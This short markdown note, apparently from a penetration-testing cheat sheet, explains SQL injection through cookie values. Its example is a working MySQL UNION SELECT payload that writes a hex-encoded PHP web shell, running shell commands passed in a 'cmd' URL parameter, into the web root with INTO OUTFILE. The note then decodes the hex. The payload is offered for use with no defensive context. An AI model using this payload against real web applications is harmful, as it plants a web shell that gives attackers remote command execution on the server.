# Cookie Based SQLi

## Overview
You can sometimes conduct SQLi via a cookie, if the cookie is processed by a database such as MySQL on the backend, this can be used to leverage PHP and gain RCE in web applications.

## Example

'UNION SELECT 1, 0x3c3f706870206563686f20223c7072653e22202e207368656c6c5f6578656328245f4745545b22636d64225d29202e20223c2f7072653e223b3f3e INTO OUTFILE 'var/www/html/shell.php'-- -

Where the hex is actually:

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>
